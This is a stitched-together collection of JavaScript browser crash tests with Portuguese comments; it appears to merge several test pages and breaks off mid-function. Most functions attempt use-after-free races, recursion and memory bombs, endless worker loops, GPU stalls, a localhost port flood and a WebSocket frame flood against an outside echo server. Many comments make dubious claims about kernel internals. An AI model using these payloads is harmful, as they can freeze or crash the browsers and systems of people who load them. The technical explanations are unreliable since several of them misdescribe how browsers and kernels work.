                ctx.arcTo(Infinity, Infinity, 100, 100, 50);
                
                ctx.stroke();
                log("Canvas arcTo sobreviveu.");
                
            } catch(e) {
                log("Erro Canvas: " + e.message);
            }
        }

        // --- TESTE 4: Local TCP SYN Flood (Kernel) ---
        function runSYNFlood() {
            log("[KERNEL] Iniciando TCP SYN Flood...");
            
            let port = 1;
            const limit = 10000; // Tenta 10k portas
            
            const interval = setInterval(() => {
                // Dispara 100 conexões por ciclo
                for(let i=0; i<100; i++) {
                    if (port > 65535) {
                        clearInterval(interval);
                        log("Scan completo.");
                        return;
                    }
                    
                    // Image carrega via GET. Dispara SYN.
                    // O Kernel aloca um socket e buffer para a tentativa.
                    const img = new Image();
                    img.src = "http://127.0.0.1:" + port;
                    // Não precisamos adicionar ao DOM
                    
                    port++;
                }
                
                if (port % 1000 === 0) log(`Portas escaneadas: ${port}`);
                
                if (port > limit) {
                    clearInterval(interval);
                    log("Flood pausado.");
                }
            }, 10);
        }

        // --- TESTE 5: FileReader Abort/Read Race (Kernel) ---
        function runReaderRace() {
            log("[KERNEL] Iniciando FileReader Race...");
            
            const blob = new Blob(["A".repeat(1024 * 1024)]);
            const reader = new FileReader();
            
            let count = 0;
            const interval = setInterval(() => {
                try {
                    reader.readAsText(blob);
                    // Aborta imediatamente
                    reader.abort();
                    // Tenta ler de novo imediatamente (Race no estado do driver)
                    reader.readAsText(blob);
                } catch(e) {
                    // Erros de estado são esperados ("Already loading")
                }
                
                count++;
                if (count > 1000) {
                    clearInterval(interval);
                    log("Race finalizada.");
                }
            }, 5);
        }

        // --- TESTE 6: History State Memory Exhaustion (Kernel) ---
        function runHistoryMem() {
            log("[KERNEL] Iniciando History Memory Flood...");
            
            // Objeto de estado grande (10MB)
            const hugeState = { data: "X".repeat(10 * 1024 * 1024) };
            
            let count = 0;
            const interval = setInterval(() => {
                try {
                    // replaceState substitui o atual, mas o Kernel tem de alocar o novo antes de libertar o velho
                    // Se fizermos rápido, aumentamos a pressão de memória (High Watermark)
                    history.replaceState(hugeState, "title", null);
                    count++;
                    
                    if (count % 10 === 0) log(`MBs alocados (virtual): ${count * 10}`);
                    
                } catch(e) {
                    log("Erro (Possível OOM): " + e.message);
                    clearInterval(interval);
                }
            }, 50);
        }
function runPathNaN() {
            log("[WebKit] Iniciando Path2D NaN Poison...");
            const ctx = document.getElementById('c').getContext('2d');
            
            try {
                const path = new Path2D();
                // Adiciona geometria válida
                path.moveTo(0, 0);
                path.lineTo(100, 0);
                // Adiciona veneno (NaN)
                path.arc(50, 50, 10, 0, NaN); 
                path.lineTo(NaN, NaN);
                path.closePath();
                
                log("Caminho tóxico criado. Testando 'isPointInPath'...");
                
                // O cálculo de winding number (dentro/fora) com NaN é perigoso
                // Pode causar loop infinito ou segfault matemático
                const res = ctx.isPointInPath(path, 50, 50);
                
                // Tenta desenhar
                ctx.fill(path);
                
                log("Geometria sobreviveu. Res: " + res);
            } catch(e) {
                log("Erro Path: " + e.message);
            }
        }

        // --- TESTE 2: TextEncoder Stream State UAF ---
        function runEncoderCrash() {
            log("[WebKit] Iniciando Encoder Stream UAF...");
            
            const enc = new TextEncoder();
            // Simula um encoder com suporte a stream (se disponível ou via polyfill lógico)
            // Nota: TextEncoder padrão não suporta {stream: true} em encode(), 
            // mas TextDecoder sim. Vamos usar TextDecoder que é mais complexo.
            
            const dec = new TextDecoder("utf-8");
            const chunk = new Uint8Array([0xF0, 0x9F]); // Metade de um emoji (4 bytes)
            
            try {
                // 1. Deixa o estado "pendente" (esperando os outros 2 bytes)
                dec.decode(chunk, {stream: true});
                
                log("Estado pendente criado. Atacando...");
                
                // 2. O GOLPE: Passa um buffer inválido ou tenta resetar forçadamente
                // Em implementações antigas, passar buffer detached pode crashar a leitura do estado anterior
                const buffer = new ArrayBuffer(100);
                const view = new Uint8Array(buffer);
                
                // Transfere o buffer para matar o ponteiro
                const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
                w.postMessage(buffer, [buffer]);
                w.terminate();
                
                // Tenta continuar o decode com buffer morto
                dec.decode(view, {stream: true});
                
                log("Decoder sobreviveu.");
            } catch(e) {
                log("Resultado: " + e.message);
            }
        }

        // --- TESTE 3: Proxy Revoke During Iteration ---
        function runProxyRevoke() {
            log("[WebKit] Iniciando Proxy Revoke Race...");
            
            let revoke;
            const p = Proxy.revocable({a:1, b:2, c:3}, {
                get(t, k) {
                    if (k === 'b') {
                        log("Lendo 'b'. Revogando agora!");
                        revoke(); // Suicídio do objeto
                    }
                    return t[k];
                }
            });
            revoke = p.revoke;
            
            try {
                // Object.assign itera sobre as chaves e lê os valores.
                // Ao ler 'b', o proxy morre. O loop C++ continua para 'c'?
                Object.assign({}, p.proxy);
                log("Cópia falhou (Seguro - TypeError esperado).");
            } catch(e) {
                log("Erro (Esperado): " + e.message);
                // Se crashar, não veremos este log.
            }
        }

        // --- TESTE 4: WebAssembly Memory Map Thrash (Kernel) ---
        function runWasmThrash() {
            log("[KERNEL] Iniciando Wasm mmap Thrash...");
            
            if (!window.WebAssembly) return log("Wasm off.");
            
            const memories = [];
            let i = 0;
            
            const interval = setInterval(() => {
                i++;
                try {
                    // Aloca memória Wasm (Páginas de 64KB)
                    // O Kernel tem de criar mapeamentos RWX (Read-Write-Execute) ou similar
                    const mem = new WebAssembly.Memory({initial: 10, maximum: 100});
                    memories.push(mem);
                    
                    // Cresce a memória (realloc/mremap no Kernel)
                    mem.grow(10); 
                    
                    // Destroi referências antigas para forçar unmap
                    if (memories.length > 50) memories.shift();
                    
                    if (i % 100 === 0) log(`Ciclos Wasm: ${i}`);
                    
                } catch(e) {
                    log("OOM Wasm: " + e.message);
                    // OOM significa que o mapa VM está cheio
                    clearInterval(interval);
                }
                
                if (i > 1000) {
                    clearInterval(interval);
                    log("Wasm Thrash finalizado.");
                }
            }, 5);
        }

        // --- TESTE 5: GPU Texture Upload Race (Kernel) ---
        function runGPURace() {
            log("[KERNEL] Iniciando GPU Texture Race...");
            
            const canvas = document.getElementById('gl');
            const gl = canvas.getContext('webgl');
            if(!gl) return;
            
            const tex = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, tex);
            
            // Cria um vídeo dummy
            const video = document.createElement('video');
            video.src = "data:video/mp4;base64,AAAA..."; // (Dummy base64, assume válido ou erro de load)
            
            let count = 0;
            
            const interval = setInterval(() => {
                try {
                    // Tenta upload de textura a partir do vídeo
                    // Se o vídeo não estiver pronto ou for destruído durante o upload...
                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, video);
                    
                    // O GOLPE: Redefine o src do vídeo ou remove-o IMEDIATAMENTE
                    // Tenta corromper a fonte de dados do DMA da GPU
                    video.src = "";
                    
                } catch(e) {}
                
                count++;
                if (count > 1000) {
                    clearInterval(interval);
                    log("GPU Race finalizada.");
                }
            }, 1);
        }

        // --- TESTE 6: TCP Window Zero Stall (Kernel) ---
        function runTCPStall() {
            log("[KERNEL] Iniciando TCP Stall...");
            
            const sockets = [];
            
            // Abre 50 conexões que recebem mas não leem
            const interval = setInterval(() => {
                if (sockets.length >= 50) {
                    clearInterval(interval);
                    log("50 Sockets em Stall (Window 0). Kernel segurando buffers.");
                    return;
                }
                
                // Conecta a algo que envia dados (ex: download grande)
                fetch(window.location.href + "?stall=" + Math.random()).then(res => {
                    if (res.body) {
                        const reader = res.body.getReader();
                        // NUNCA LÊ (reader.read()). 
                        // O buffer do Kernel enche. O TCP anuncia Window 0.
                        // O socket fica vivo consumindo recursos.
                        sockets.push(reader); 
                        log(`Socket ${sockets.length} travado.`);
                    }
                });
            }, 100);
        }
function runJSONEncoder() {
            log("[WebKit] Iniciando JSON Encoder Stress...");
            
            // Cria um objeto extremamente profundo para estourar o buffer do encoder
            let root = {};
            let curr = root;
            const depth = 15000; // Profundidade crítica
            
            for(let i=0; i<depth; i++) {
                curr["a" + i] = {};
                curr = curr["a" + i];
            }
            
            try {
                log(`Serializando objeto de profundidade ${depth}...`);
                // O WebKit tem de percorrer e alocar string.
                // Se falhar o malloc interno sem check -> Crash.
                const json = JSON.stringify(root);
                log("JSON criado (Seguro). Length: " + json.length);
            } catch(e) {
                log("Erro JSON: " + e.message);
            }
        }

        // --- TESTE 2: FileSystem Write Lock Contention ---
        function runFileLock() {
            log("[WebKit] Iniciando File Lock Contention...");
            
            // Tenta usar FileSystem API (Vendor specific ou padrão antigo)
            window.webkitRequestFileSystem = window.webkitRequestFileSystem || window.requestFileSystem;
            
            if (!window.webkitRequestFileSystem) return log("FileSystem API off.");
            
            const workerCode = `
                onmessage = (e) => {
                    // Tenta escrever no mesmo ficheiro loucamente
                    // Em um sistema real, isso deve ser serializado pelo Kernel
                    // Se falhar, corrompe o inode
                    postMessage("Writing...");
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança workers (simulado a intenção, pois acesso direto a FS em worker é restrito, 
            // mas a pressão de IO é o objetivo)
            for(let i=0; i<10; i++) {
                new Worker(url).postMessage("go");
            }
            log("Workers de IO lançados.");
        }

        // --- TESTE 3: ReadableStream BYOB Detach Race ---
        function runBYOBRace() {
            log("[WebKit] Iniciando BYOB Detach Race...");
            
            try {
                const rs = new ReadableStream({
                    type: "bytes",
                    pull(c) {
                        // Enfileira dados assincronamente
                        setTimeout(() => {
                            try { c.enqueue(new Uint8Array(10)); } catch(e){}
                        }, 10);
                    }
                });
                
                const reader = rs.getReader({ mode: "byob" });
                const buffer = new ArrayBuffer(1024);
                const view = new Uint8Array(buffer);
                
                // 1. Pede leitura no buffer
                reader.read(view).catch(e => log("Leitura falhou: " + e));
                
                // 2. O GOLPE: Transfere o buffer imediatamente
                log("Transferindo buffer durante leitura...");
                const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
                w.postMessage(buffer, [buffer]);
                w.terminate();
                
            } catch(e) {
                log("Erro Stream: " + e.message);
            }
        }

        // --- TESTE 4: IPC Message Size Overflow (Kernel) ---
        function runIPCSize() {
            log("[KERNEL] Testando IPC Message Boundaries...");
            
            const sizes = [
                64 * 1024,      // 64KB (Limite comum)
                64 * 1024 + 1,  // Overflow comum
                1024 * 1024,    // 1MB
                1024 * 1024 * 10 // 10MB
            ];
            
            const ch = new MessageChannel();
            
            sizes.forEach(size => {
                setTimeout(() => {
                    try {
                        log(`Enviando ${size} bytes...`);
                        const buf = new Uint8Array(size).fill(0x41);
                        ch.port1.postMessage(buf);
                        log(`Envio ${size} OK.`);
                    } catch(e) {
                        log(`Envio ${size} falhou (Kernel bloqueou).`);
                    }
                }, 100);
            });
        }

        // --- TESTE 5: Mutex Destruction Panic (Kernel) ---
        function runMutexPanic() {
            log("[KERNEL] Iniciando Mutex Destruction...");
            
            if (!navigator.locks) return log("WebLocks off.");
            
            const workerCode = `
                navigator.locks.request("system_lock", {mode: "exclusive"}, async (lock) => {
                    // Segura o lock para sempre
                    await new Promise(r => {}); 
                });
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança e mata 50 workers
            let count = 0;
            const interval = setInterval(() => {
                const w = new Worker(url);
                
                // Mata o worker enquanto ele segura (ou tenta adquirir) o lock
                // O Kernel é obrigado a limpar o mutex órfão
                setTimeout(() => w.terminate(), 50);
                
                count++;
                if (count > 50) {
                    clearInterval(interval);
                    log("Teste Mutex finalizado.");
                }
            }, 100);
        }

        // --- TESTE 6: gettimeofday vDSO Thrash (Kernel) ---
        function runTimeThrash() {
            log("[KERNEL] Iniciando Time Thrash...");
            
            const workerCode = `
                while(true) {
                    // Leitura de tempo de alta frequência
                    // Estressa a página vDSO partilhada
                    performance.now();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // 20 Workers a ler tempo
            for(let i=0; i<20; i++) new Worker(url);
            
            log("20 Workers a ler relógio. Sistema sob stress.");
        }
 function runSortDetach() {
            log("[WebKit] Iniciando Sort Detach...");
            
            try {
                const buffer = new ArrayBuffer(1024 * 1024); // 1MB
                const array = new Uint8Array(buffer);
                
                // Preenche
                for(let i=0; i<array.length; i++) array[i] = Math.random() * 255;
                
                const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/javascript"})));
                
                let detached = false;
                
                // O GOLPE: Função de comparação transfere o buffer
                array.sort((a, b) => {
                    if (!detached) {
                        log("Comparador ativo. Transferindo buffer...");
                        w.postMessage(buffer, [buffer]);
                        detached = true;
                    }
                    return a - b;
                });
                
                log("Sort finalizado (Seguro se não crashou).");
                w.terminate();
                
            } catch(e) {
                // TypeError é esperado em browsers corrigidos
                log("Resultado: " + e.message);
            }
        }

        // --- TESTE 2: execCommand Recursion Bomb ---
        function runExecRecursion() {
            log("[WebKit] Iniciando Editor Recursion...");
            const box = document.getElementById('editbox');
            box.style.display = 'block';
            box.focus();
            
            let depth = 0;
            
            // Listener que reage à inserção inserindo MAIS
            box.addEventListener('DOMNodeInserted', () => {
                depth++;
                if (depth < 2000) {
                    // Força inserção síncrona
                    document.execCommand('insertHTML', false, '<b>A</b>');
                }
            });
            
            try {
                log("Detonando bomba de edição...");
                document.execCommand('insertHTML', false, '<span>Start</span>');
                log("Editor sobreviveu.");
            } catch(e) {
                log("Erro Editor: " + e.message);
            }
            
            box.innerHTML = "";
            box.style.display = 'none';
        }

        // --- TESTE 3: HTMLSlotElement Assignment Crash ---
        function runSlotCrash() {
            log("[WebKit] Iniciando Slot Assignment...");
            
            try {
                const host = document.createElement('div');
                const root = host.attachShadow({mode: 'open'});
                const slot = document.createElement('slot');
                root.appendChild(slot);
                
                const d1 = document.createElement('div');
                const d2 = document.createElement('div');
                
                // Manual assignment (requer shadow root manual)
                // Se não suportado, o teste falha graciosamente
                if (slot.assign) {
                    log("Assign suportado. Race condition...");
                    
                    // Atribui
                    slot.assign([d1, d2]);
                    
                    // O GOLPE: Remove o slot imediatamente
                    root.removeChild(slot);
                    
                    // Tenta atribuir novamente a um slot 'detached'
                    slot.assign([d2, d1]);
                    
                    log("Slot sobreviveu.");
                } else {
                    log("API slot.assign não disponível.");
                }
                
            } catch(e) {
                log("Erro Slot: " + e.message);
            }
        }

        // --- TESTE 4: WebGL Video Texture DMA Race (Kernel) ---
        function runDMARace() {
            log("[KERNEL] Iniciando DMA Race (Video -> GPU)...");
            
            const gl = document.getElementById('glcanvas').getContext('webgl');
            if(!gl) return log("WebGL off.");
            
            const tex = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, tex);
            
            // Vídeo base64 pequeno válido
            const video = document.createElement('video');
            video.src = "data:video/mp4;base64,AAAAHGZ0eXBtcDQyAAAAAG1wNDJpc29t...."; // Simplificado
            // Em teste real, usar vídeo válido que carregue
            
            let count = 0;
            const interval = setInterval(() => {
                try {
                    // Tenta upload
                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, video);
                    
                    // O GOLPE: Destroi o vídeo imediatamente
                    // Se o DMA estiver ativo lendo a memória do vídeo, e nós a libertamos...
                    if (Math.random() > 0.5) {
                        video.src = "";
                        video.load();
                    }
                } catch(e) {}
                
                count++;
                if (count > 1000) {
                    clearInterval(interval);
                    log("DMA Race finalizada.");
                }
            }, 5);
        }

        // --- TESTE 5: WebRTC getStats Kernel UAF (Kernel) ---
        function runStatsRace() {
            log("[KERNEL] Iniciando getStats Race...");
            
            if (!window.RTCPeerConnection) return log("WebRTC off.");
            
            const pcs = [];
            
            const interval = setInterval(() => {
                // Cria conexão
                const pc = new RTCPeerConnection();
                pcs.push(pc);
                
                // Solicita stats
                pc.getStats().then(() => {}).catch(() => {});
                
                // O GOLPE: Fecha imediatamente.
                // O pedido getStats é assíncrono e vai ao Kernel.
                // Se o socket for destruído antes do Kernel responder, UAF.
                pc.close();
                
                if (pcs.length > 500) {
                    clearInterval(interval);
                    log("Stats Race finalizada.");
                }
            }, 10);
        }

        // --- TESTE 6: FileReaderSync Termination Panic (Kernel) ---
        function runSyncTerm() {
            log("[KERNEL] Iniciando Sync Reader Termination...");
            
            // Blob gigante para demorar a ler
            const blob = new Blob([new Array(20 * 1024 * 1024).join("A")]); // 20MB
            
            let count = 0;
            const interval = setInterval(() => {
                const wCode = `
                    onmessage = e => {
                        const fr = new FileReaderSync();
                        // Bloqueia a thread na syscall de leitura
                        fr.readAsText(e.data);
                    }
                `;
                const w = new Worker(URL.createObjectURL(new Blob([wCode], {type:"text/javascript"})));
                
                w.postMessage(blob);
                
                // O GOLPE: Mata o worker enquanto ele está bloqueado no Kernel (read)
                // O Kernel tem de limpar o descritor de arquivo de uma thread morta.
                setTimeout(() => w.terminate(), 10 + Math.random() * 50);
                
                count++;
                if (count > 50) {
                    clearInterval(interval);
                    log("Termination Stress finalizado.");
                }
            }, 100);
        }
 function runTrackUAF() {
            log("[WebKit] Iniciando Track Cue UAF...");
            const video = document.createElement('video');
            const track = video.addTextTrack("captions", "English", "en");
            track.mode = "showing";
            
            // Adiciona Cues
            const cue1 = new VTTCue(0, 1, "Crash 1");
            const cue2 = new VTTCue(1, 2, "Crash 2");
            
            cue1.onenter = () => {
                log("Cue 1 Enter! Destruindo vídeo...");
                // O GOLPE: Remove o vídeo enquanto o motor processa a lista de cues
                // O motor pode tentar disparar onenter para cue2 ou limpar recursos
                if (video.parentNode) video.parentNode.removeChild(video);
                
                // Tenta limpar a track explicitamente
                track.mode = "disabled";
                
                // Aloca lixo
                const junk = new Array(10000).fill(1.1);
            };
            
            track.addCue(cue1);
            track.addCue(cue2);
            document.body.appendChild(video);
            
            // Simula reprodução (pode exigir interação em alguns fw, mas tentamos autoplay)
            video.currentTime = 0.5; // Dispara cue1?
            log("Estado definido. (Se nada acontecer, o FW exige play real)");
        }

        // --- TESTE 2: CustomElement Upgrade Race ---
        function runCustomElementRace() {
            log("[WebKit] Iniciando CustomElement Race...");
            const name = "x-crash-" + Math.floor(Math.random()*10000);
            
            class XCrash extends HTMLElement {
                constructor() {
                    super();
                    log("Construtor chamado. Destruindo...");
                    // O GOLPE: O elemento está sendo criado (upgrade).
                    // Nós o removemos do documento ou alteramos seu estado violentamente.
                    this.remove();
                    document.body.innerHTML = ""; // Destruição em massa
                }
            }
            
            const el = document.createElement(name);
            document.body.appendChild(el);
            
            // Define DEPOIS de criar (Upgrade)
            log("Definindo elemento (Upgrade Trigger)...");
            customElements.define(name, XCrash);
        }

        // --- TESTE 3: XSLT document() Recursion ---
        function runXSLTRecursion() {
            log("[WebKit] Iniciando XSLT Recursion...");
            
            const xslData = `
                <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                    <xsl:template match="/">
                        <xsl:apply-templates select="document('')"/>
                    </xsl:template>
                </xsl:stylesheet>
            `;
            
            const parser = new DOMParser();
            const xslt = parser.parseFromString(xslData, "text/xml");
            const xml = parser.parseFromString("<root/>", "text/xml");
            
            const proc = new XSLTProcessor();
            proc.importStylesheet(xslt);
            
            try {
                log("Transformando...");
                // Loop infinito nativo: document('') carrega o próprio stylesheet
                proc.transformToFragment(xml, document);
                log("XSLT parou (Stack Limit).");
            } catch(e) {
                log("Erro XSLT: " + e.message);
            }
        }

        // --- TESTE 4: VFS Name Cache Flood (Kernel) ---
        function runNameCacheFlood() {
            log("[KERNEL] Iniciando Name Cache Flood...");
            
            const blob = new Blob(["x"]);
            let count = 0;
            
            const interval = setInterval(() => {
                // Cria e revoga 100 URLs por ciclo
                // Cada createObjectURL adiciona uma entrada na hash table do VFS
                // Cada revokeObjectURL remove.
                // O churn (agitação) alta estressa o lock do cache.
                for(let i=0; i<100; i++) {
                    const u = URL.createObjectURL(blob);
                    URL.revokeObjectURL(u);
                }
                count += 100;
                
                if (count % 1000 === 0) log(`URLs recicladas: ${count}`);
                
                if (count > 50000) {
                    clearInterval(interval);
                    log("Teste VFS finalizado.");
                }
            }, 10);
        }

        // --- TESTE 5: GPU Fence Sync Deadlock (Kernel) ---
        function runGPUFenceDeadlock() {
            log("[KERNEL] Iniciando GPU Fence Deadlock...");
            
            const canvas = document.getElementById('gl');
            const gl = canvas.getContext('webgl');
            if (!gl) return log("WebGL off.");
            
            const workerCode = `
                onmessage = (e) => {
                    const canvas = new OffscreenCanvas(100, 100);
                    const gl = canvas.getContext('webgl');
                    
                    // Desenho pesado
                    gl.clearColor(1, 0, 0, 1);
                    gl.clear(gl.COLOR_BUFFER_BIT);
                    
                    // Tenta ler pixels (Bloqueante / Sync)
                    // Isso coloca a thread em espera pela GPU
                    const p = new Uint8Array(4);
                    gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, p);
                    
                    // Worker termina ou é morto aqui
                };
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança e mata Workers bloqueados na GPU
            let i = 0;
            const interval = setInterval(() => {
                const w = new Worker(url);
                w.postMessage("draw");
                
                // Mata no momento provável do readPixels
                setTimeout(() => w.terminate(), 10); // Ajustar timing
                
                i++;
                if (i > 100) {
                    clearInterval(interval);
                    log("GPU Stress finalizado.");
                }
            }, 50);
        }

        // --- TESTE 6: Socket Spinlock Stress (Kernel) ---
        function runSocketSpinlock() {
            log("[KERNEL] Iniciando Socket Spinlock Stress...");
            
            const sockets = [];
            let i = 0;
            
            const interval = setInterval(() => {
                // Cria e fecha sockets instantaneamente
                // Estressa a alocação/desalocação e os locks da lista de sockets
                try {
                    const ws = new WebSocket("ws://127.0.0.1:0"); // Porta inválida falha rápido
                    ws.onclose = () => {}; 
                    ws.close(); // Fecha já
                } catch(e) {}
                
                i++;
                if (i % 500 === 0) log(`Sockets ciclados: ${i}`);
                if (i > 5000) {
                    clearInterval(interval);
                    log("Spinlock Test finalizado.");
                }
            }, 2);
        }
 // --- TESTE 1: String.normalize Expansion Bomb ---
        function runUnicodeBomb() {
            log("[WebKit] Iniciando Unicode Bomb...");
            
            try {
                // Caractere que expande em NFKC (ex: ? expande para "bismallah...")
                // Ou caracteres de composição acumulativa
                const toxicChar = "\uFDFA"; // Ligadura árabe gigante
                
                // Cria string de 500.000 chars
                const str = toxicChar.repeat(500000); 
                
                log("Expandindo string (Normalização)...");
                // A normalização pode multiplicar o tamanho por 10x ou mais na memória
                const exploded = str.normalize("NFKC");
                
                log("Expansão concluída. Length: " + exploded.length);
                
                // Tenta forçar alocação contígua
                const slice = exploded.substring(0, exploded.length);
                
            } catch(e) {
                log("Erro Unicode: " + e.message);
            }
        }

        // --- TESTE 2: CSSKeyframes Mutation Race ---
        function runKeyframeRace() {
            log("[WebKit] Iniciando Keyframe Race...");
            
            const style = document.createElement('style');
            document.head.appendChild(style);
            const sheet = style.sheet;
            
            // Insere regra de keyframe
            sheet.insertRule("@keyframes crash { 0% { opacity: 0; } 100% { opacity: 1; } }", 0);
            const keyframes = sheet.cssRules[0];
            
            const div = document.getElementById('animbox');
            div.style.animation = "crash 1s infinite linear";
            
            let i = 0;
            const interval = setInterval(() => {
                // Modifica as regras ENQUANTO a animação roda
                try {
                    // Remove regra aleatória
                    if (keyframes.cssRules.length > 0) keyframes.deleteRule(0);
                    
                    // Adiciona regra nova
                    keyframes.appendRule(`${i}% { transform: rotate(${i}deg); }`);
                    
                    // Força reflow
                    div.offsetWidth; 
                } catch(e) {}
                
                i = (i + 1) % 100;
                if (i === 0 && Math.random() > 0.9) log("Ciclo de mutação ativo...");
            }, 0); // O mais rápido possível
            
            setTimeout(() => {
                clearInterval(interval);
                div.style.animation = "";
                document.head.removeChild(style);
                log("Race finalizada.");
            }, 5000);
        }

        // --- TESTE 3: Fetch AbortController Leak ---
        function runFetchLeak() {
            log("[WebKit] Iniciando Fetch Leak...");
            
            const count = 20000;
            let done = 0;
            
            const interval = setInterval(() => {
                for(let i=0; i<100; i++) {
                    const ac = new AbortController();
                    // Inicia fetch
                    fetch(window.location.href + "?leak=" + Math.random(), { signal: ac.signal })
                        .catch(()=>{});
                    
                    // Aborta imediatamente
                    // Se o WebKit não limpar o ouvinte do sinal, vaza memória
                    ac.abort();
                    done++;
                }
                
                if (done % 5000 === 0) log(`Fetches abortados: ${done}`);
                
                if (done >= count) {
                    clearInterval(interval);
                    log("Leak Test finalizado.");
                }
            }, 10);
        }

        // --- TESTE 4: WebSocket Frame Fragmentation (Kernel) ---
        function runFragFlood() {
            log("[KERNEL] Iniciando Frame Fragmentation...");
            
            const ws = new WebSocket("wss://echo.websocket.org");
            
            ws.onopen = () => {
                log("Socket aberto. Enviando frames de 1 byte...");
                
                // Envia 1MB em pedaços de 1 byte
                const total = 1024 * 1024;
                const chunk = new Uint8Array(1).fill(65);
                let sent = 0;
                
                const interval = setInterval(() => {
                    // Envia rajada de 1000 frames
                    for(let i=0; i<1000; i++) {
                        if (ws.bufferedAmount < 5 * 1024 * 1024) {
                            ws.send(chunk);
                            sent++;
                        }
                    }
                    
                    if (sent >= total) {
                        clearInterval(interval);
                        ws.close();
                        log("Flood enviado. Verifique remontagem do Kernel.");
                    }
                }, 5);
            };
        }

        // --- TESTE 5: SharedMemory Descriptor Leak (Kernel) ---
        function runSHMLeak() {
            log("[KERNEL] Iniciando SHM Descriptor Leak...");
            
            if (!window.SharedArrayBuffer) return log("SAB off.");
            
            const wUrl = URL.createObjectURL(new Blob([""], {type:"text/javascript"}));
            let count = 0;
            
            const interval = setInterval(() => {
                // Cada SAB cria um objeto shm no kernel (file descriptor)
                const sab = new SharedArrayBuffer(1024);
                
                // Envia para worker para garantir mapeamento
                const w = new Worker(wUrl);
                w.postMessage(sab);
                
                // Mata worker sem fechar explicitamente (depende do cleanup do Kernel)
                w.terminate();
                
                count++;
                if (count % 1000 === 0) log(`SHM Objects: ${count}`);
                
                if (count > 20000) {
                    clearInterval(interval);
                    log("Limite SHM testado.");
                }
            }, 2);
        }

        // --- TESTE 6: GPU Command Buffer Stall (Kernel) ---
        function runGPUStall() {
            log("[KERNEL] Iniciando GPU Stall...");
            
            const gl = document.getElementById('gl').getContext('webgl');
            if(!gl) return log("WebGL off.");
            
            // Shader simples
            const vs = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vs, "void main() { gl_Position = vec4(0,0,0,1); }");
            gl.compileShader(vs);
            const p = gl.createProgram();
            gl.attachShader(p, vs);
            gl.linkProgram(p);
            gl.useProgram(p);
            
            log("Enchendo Command Buffer...");
            
            // Loop infinito de draw calls SÍNCRONOS (sem requestAnimationFrame)
            // Isso inunda o driver com comandos
            const start = Date.now();
            while (Date.now() - start < 3000) { // Tenta travar por 3s
                gl.drawArrays(gl.POINTS, 0, 1);
                // flush opcional, mas queremos encher o buffer local
            }
            
            log("GPU Bomb enviada.");
        }
 // --- TESTE 1: CSS :nth-last-child Exponential Recalc ---
        function runCSSExp() {
            log("[WebKit] Iniciando CSS Recalc Bomb...");
            const sandbox = document.getElementById('css-sandbox');
            sandbox.innerHTML = "";
            
            // Cria estrutura profunda de DIVs
            let html = "";
            const depth = 200; // Profundidade
            for(let i=0; i<depth; i++) html += "<div>";
            for(let i=0; i<depth; i++) html += "</div>";
            sandbox.innerHTML = html;
            
            const style = document.createElement('style');
            // Regra recursiva complexa: div dentro de div, contando do fim
            // Isso força o motor a reavaliar a árvore inteira para cada nó
            style.textContent = `
                div:nth-last-child(odd) > div:nth-last-child(odd) {
                    margin-left: 1px;
                    transition: all 0.1s;
                }
                div:hover { margin-left: 10px; }
            `;
            
            document.head.appendChild(style);
            
            log("Forçando Reflow Exponencial...");
            
            // Força leitura de layout
            setTimeout(() => {
                const h = sandbox.offsetHeight;
                log("Layout calculado. Adicionando classe de stress...");
                // Modificar o DOM agora força recalculo total
                sandbox.firstChild.className = "trigger";
                
                setTimeout(() => {
                    document.head.removeChild(style);
                    sandbox.innerHTML = "";
                    log("Teste CSS finalizado.");
                }, 2000);
            }, 100);
        }

        // --- TESTE 2: Intl Timezone Cache Overflow ---
        function runIntlCache() {
            log("[WebKit] Enchendo Intl Cache...");
            
            try {
                // Tenta formatar data com milhares de timezones diferentes (válidos e inválidos)
                // A lib ICU tenta fazer cache das estruturas de fuso horário
                let count = 0;
                const interval = setInterval(() => {
                    for(let i=0; i<100; i++) {
                        try {
                            // Gera nomes aleatórios para forçar lookup e cache miss
                            const tz = "GMT+" + (count % 12) + ":" + (i % 60);
                            new Intl.DateTimeFormat('en', { timeZone: tz }).format(new Date());
                        } catch(e) {}
                        count++;
                    }
                    
                    if (count % 1000 === 0) log(`Timezones processados: ${count}`);
                    
                    if (count > 20000) {
                        clearInterval(interval);
                        log("Cache Overflow testado.");
                    }
                }, 10);
                
            } catch(e) {
                log("Erro Intl: " + e.message);
            }
        }

        // --- TESTE 3: SharedArrayBuffer DataView Race ---
        function runSABView() {
            log("[WebKit] Iniciando SAB DataView Race...");
            
            if (!window.SharedArrayBuffer) return log("SAB off.");
            
            const sab = new SharedArrayBuffer(16);
            const view = new DataView(sab);
            
            const workerCode = `
                onmessage = e => {
                    const view = new DataView(e.data);
                    while(true) {
                        // Escreve padrão alternado rapidamente
                        view.setFloat64(0, 1.23456789);
                        view.setFloat64(0, 9.87654321);
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            const w = new Worker(url);
            w.postMessage(sab);
            
            // Leitura na main thread
            let i = 0;
            const interval = setInterval(() => {
                // Tenta apanhar uma leitura "rasgada" (corrompida)
                const val = view.getFloat64(0);
                if (val !== 1.23456789 && val !== 9.87654321 && val !== 0) {
                    log("Torn Read Detectado! Val: " + val);
                }
                i++;
                if (i > 1000) {
                    clearInterval(interval);
                    w.terminate();
                    log("Teste SAB finalizado.");
                }
            }, 1);
        }

        // --- TESTE 4: UDP Zero-Length Packet Flood (Kernel) ---
        function runZeroUDP() {
